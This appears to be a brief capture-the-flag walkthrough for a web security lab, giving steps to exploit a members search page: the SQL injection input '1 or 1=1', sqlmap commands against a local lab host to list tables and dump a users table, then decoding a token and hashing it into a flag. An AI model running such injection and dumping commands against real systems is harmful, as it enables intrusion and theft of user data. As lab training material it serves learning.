python route
1. go to the members tab.
2. type in the search bar "1 or 1=1"
3. sqlmap.py --url="http://192.168.1.117/?page=member&id=1+or+1+%3D+1&Submit=Submit#" --tables
4. sqlmap.py --url="http://192.168.1.117/?page=member&id=1+or+1+%3D+1&Submit=Submit#" --dump -T users
5. decrypt the token which gives you "FortyTwo"
6. then sha256 encrypt "Sha256(fortytwo) = 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5"